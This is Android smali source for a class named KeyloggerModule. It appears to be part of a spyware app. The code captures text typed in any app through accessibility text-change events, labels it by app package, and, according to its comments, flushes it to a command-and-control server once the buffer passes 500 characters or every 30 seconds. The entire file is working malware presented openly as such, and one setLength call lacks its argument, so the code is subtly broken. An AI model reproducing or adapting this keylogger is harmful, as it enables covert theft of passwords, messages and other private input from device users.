.class public Lcom/smilex/enhanced/modules/KeyloggerModule;
.super Ljava/lang/Object;
.source "KeyloggerModule.java"

# Captures typed text (keylog) from any app via accessibility TYPE_VIEW_TEXT_CHANGED events.
# Ported from hwapp391 hw/imreader/ReaderAccessibilityService.java typed text logic.
# Buffers keystrokes and flushes to C2 when buffer reaches threshold or on demand.

.field private static sBuffer:Ljava/lang/StringBuilder;
.field private static sLastPackage:Ljava/lang/String;
.field private static sLastFlush:J

.method public constructor <init>()V
    .registers 1
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V
    return-void
.end method

.method static constructor <clinit>()V
    .registers 3
    new-instance v0, Ljava/lang/StringBuilder;
    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V
    sput-object v0, Lcom/smilex/enhanced/modules/KeyloggerModule;->sBuffer:Ljava/lang/StringBuilder;
    const-wide/16 v0, 0x0
    sput-wide v0, Lcom/smilex/enhanced/modules/KeyloggerModule;->sLastFlush:J
    return-void
.end method

# Called by AccessibilityMonitorService for TYPE_VIEW_TEXT_CHANGED events
.method public static onTextChanged(Ljava/lang/String;Ljava/lang/String;)V
    .registers 8
    # p0 = packageName, p1 = text
    if-eqz p0, :return_void
    if-eqz p1, :return_void

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;
    move-result-object p1
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z
    move-result v0
    if-nez v0, :return_void

    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/KeyloggerModule;->sBuffer:Ljava/lang/StringBuilder;

    # If package changed, add separator
    sget-object v1, Lcom/smilex/enhanced/modules/KeyloggerModule;->sLastPackage:Ljava/lang/String;
    if-eqz v1, :same_pkg
    invoke-virtual {v1, p0}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z
    move-result v1
    if-nez v1, :same_pkg

    const-string v1, "\n["
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    invoke-virtual {v0, p0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1, "] "
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    :same_pkg
    sput-object p0, Lcom/smilex/enhanced/modules/KeyloggerModule;->sLastPackage:Ljava/lang/String;
    invoke-virtual {v0, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;
    const-string v1, " "
    invoke-virtual {v0, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    # Flush if buffer > 500 chars or > 30s since last flush
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I
    move-result v1
    const/16 v2, 0x1f4  # 500
    if-ge v1, v2, :flush

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v2
    sget-wide v4, Lcom/smilex/enhanced/modules/KeyloggerModule;->sLastFlush:J
    sub-long/2addr v2, v4
    const-wide/32 v4, 0x7530  # 30000ms = 30s
    cmp-long v6, v2, v4
    if-ltz v6, :return_void

    :flush
    invoke-static {}, Lcom/smilex/enhanced/modules/KeyloggerModule;->flush()V

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    return-void
.end method

# Flush buffer to C2
.method public static flush()V
    .registers 6
    :try_start
    sget-object v0, Lcom/smilex/enhanced/modules/KeyloggerModule;->sBuffer:Ljava/lang/StringBuilder;
    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I
    move-result v1
    if-lez v1, :return_void

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;
    move-result-object v1

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->setLength(I)V

    const-string v2, "keylog"
    invoke-static {v2, v1}, Lcom/smilex/enhanced/modules/NetworkModule;->sendData(Ljava/lang/String;Ljava/lang/String;)V

    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J
    move-result-wide v2
    sput-wide v2, Lcom/smilex/enhanced/modules/KeyloggerModule;->sLastFlush:J

    :return_void
    return-void
    :try_end
    .catch Ljava/lang/Exception; {:try_start .. :try_end} :error
    :error
    return-void
.end method
